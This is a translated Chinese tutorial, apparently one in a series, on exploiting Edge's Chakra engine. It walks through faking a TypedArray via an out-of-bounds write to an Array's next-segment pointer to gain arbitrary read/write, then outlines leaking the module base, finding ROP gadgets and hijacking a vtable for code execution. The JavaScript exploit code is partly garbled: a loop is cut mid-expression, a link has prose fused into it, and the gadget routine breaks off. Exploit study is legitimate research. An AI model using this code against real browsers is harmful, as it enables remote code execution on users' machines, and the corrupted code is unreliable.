# Edge 零基础漏洞利用——进阶版
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前情提要
上一篇文章我们讲到需要 fake 一个 TypedArray 来达到任意地址读写。想要 fake 任意对象，首先需要知道该对象的元数据，需要 fake 的
TypedArray 元数据怎么获得？
###  补充一些背景知识
以下为 TypedArray 的元数据信息，+0x38 处存放着视图的实际数据。
    0:003> dx -r1 ((chakracore!Js::TypedArrayBase *) 0x0000018d`936b3980 )
    ((chakracore!Js::TypedArrayBase *) 0x0000018d`936b3980 )                 : 0x18d936b3980 [Type: Js::TypedArray * (derived from Js::TypedArrayBase *)]
        [+0x008] type             : 0x18d93675480 [Type: Js::Type *]
        [+0x010] auxSlots         : 0x0 [Type: void * *]
        [+0x018] objectArray      : 0x0 [Type: Js::ArrayObject *]
        [+0x018] arrayFlags       : None (0x0) [Type: Js::DynamicObjectFlags]
        [+0x01a] arrayCallSiteIndex : 0x0 [Type: unsigned short]
        [+0x020] length           : 0x400 [Type: unsigned int]
        [+0x028] arrayBuffer      : 0x18d936d0140 [Type: Js::ArrayBufferBase *]
        [+0x030] BYTES_PER_ELEMENT : 4 [Type: int]
        [+0x034] byteOffset       : 0x0 [Type: unsigned int]
        [+0x038] buffer           : 0x18591bc8730 : 0x30 [Type: unsigned char *]
已经获得的越界读写只能访问数组后面的内存，如果 TypedArray 元数据被分配在越界读写数组的前面怎么办？需要数据喷射吗？原理可行，但是这里采用
fake Array 的方式来完成，这样更加简单、稳定。 fake Array 的方式需要点背景知识，这里来补充下。
###  Array 的背景知识
先回顾一下第一篇文章中介绍的 Array 的元数据， 常用的域包括 left 、length、size、 next Segment 几个。
Array 头部的 next segment 信息存储的是下一个 segment 的头部，其余的域属于当前的 segment 。为什么Chakra 不把
segment 放在一起，而是用指针的方式链接起来呢？因为 Chakra 在管理数组存储的时候，需要管理一种特殊的数组：Sparse
数组。即以下这种数组使用方式：
    var arr = new Array(10);
    arr[0x100000] = 10;
原始的数组空间不足以在索引 0x100000 处存储数据，所以需要 new 一块新的内存， 然后这块数据的相关信息保存在 next segment 位置。
## Fake Array
Array 的背景知识可以解决 fake Array 的问题，进而解决TypedArray 元数据怎么获得的问题。既然我们知道 next segment
保存的是下一个Array的信息， 如果我们利用越界写把它指向 DataView 的元数据，那么不就可以读取TypedArray
的元数据了吗，任意地址读写不就达到了吗？说干就干，我们实现以下逻辑：
    function fake_TypedArray(){
        modify_oob_arr_attri(0x7fffffff);
        var arr_len_index = 0x50000/4 -5 ;
        var arr_size_index = 0x50000/4 -4 ;
        var arr_buff_low = leak_obj_addr(arr_buff) % 0x100000000;
        var addr_dv = leak_obj_addr(dv);
        var int_arr_next_high_index = 0x100000000/4 + 13;
        var int_arr_next_low_index = 0x100000000/4 + 12;
        var int_arr_next_high = parseInt((addr_dv + 0x28) /0x100000000);
        var int_arr_next_low  = (addr_dv + 0x28) % 0x100000000;
        oob_write(vul_arr, int_arr_next_low_index, int_arr_next_low); 
        oob_write(vul_arr, int_arr_next_high_index, int_arr_next_high);
        modify_oob_arr_attri(0x0);
        var index =  arr_buff_low;
        for(var i=0; i 0x7fffffff ? dv[0xe] - 0x100000000: dv[0xe];
        int_arr[obj_arr_0_high] = dv[0xf];    
        dv_rw = obj_arr[0];    
    }
fake TypedArray 前后对比： 我们可以观察到，fake TypedArray 以后，windbg 已经将它识别为 TypedArray，标志着
fake TypedArray 的成功。
大致的逻辑是： 越界写将 int_arr 的next segment 指向 DataView， 然后用 int_arr 来读取 TypedArray
的元数据。读取的 TypedArray 元数据信息保存到另一个 TypedArray（dv） 的数据部分。这片新的内存即成为一个 fake 的
TypedArray，这里称为：dv_rw。由于 dv_rw 的元数据中包含视图数据的地址信息，而 dv 对 dv_rw
的元数据完全可控，也就完成了任意地址读写的目标，详细的逻辑请参考示例代码。
## 任意地址读写 to RCE
代码执行的前提条件是：我们对当前模块足够熟悉，知道 Chakra 中可执行代码位于哪里，以便我们获取到需要的 gadget
来完成代码执行。目标分解，需要以下三步骤即可代码执行：
####  1\. Chakra 的基地址。
####  2\. 解析 PE 获取 code 段信息， 获取gadges。
####  3\. 修改虚表指针，指向 gadgets。
###  1\. Chakra 的基地址
leak 模块基址的思路很简单：通过 leak_obj_addr 泄漏任意一个 obj 的 vtable，然后将 vtable 进行 0x10000
对齐后，每次减去 0x10000 去匹配 PE 文件的 Dos header 中的 Magic data。
###  2\. 解析 PE 获取 code 段信息， 获取gadges
关于 PE 结构的解析，可以用第三方软件辅助我们解析(比如：CFF explorer), 也可以MS参考官方文档：
[https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format。先理清大致概念后，再动手写解析的代码。](https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format%E3%80%82%E5%85%88%E7%90%86%E6%B8%85%E5%A4%A7%E8%87%B4%E6%A6%82%E5%BF%B5%E5%90%8E%EF%BC%8C%E5%86%8D%E5%8A%A8%E6%89%8B%E5%86%99%E8%A7%A3%E6%9E%90%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82)
获取 gadget 的逻辑，可以参考以下笔者的示例代码：
    var byteArray = new Uint8Array(array.buffer);
    var gadgets = {};
    query.forEach((gadget) => {
        var name = gadget[0], bytes = gadget[1];
        var idx = 0;
        while (true) {
            idx = byteArray.indexOf(bytes[0], idx);
            if (idx < 0) {
                log('missing gadget ' + name);
            gadgets[name] = null;
            return gadgets;